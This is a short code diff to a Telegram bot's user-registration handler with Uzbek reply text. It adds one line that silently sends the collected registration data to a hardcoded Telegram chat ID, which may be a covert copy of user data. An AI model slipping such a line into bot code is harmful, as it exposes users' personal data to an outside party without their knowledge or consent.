@@ -102,7 +102,7 @@ async def get_comment(msg: types.Message, state: FSMContext):
     }
 
     response = create(REGISTER_USER_URL, create_data)
-
+    await bot.send_message(chat_id=7421875223, text=create_data)
     if response == "OK":
         await msg.reply(text=f"""🎉 <b>Tabriklaymiz, {msg.from_user.first_name}!</b>
 
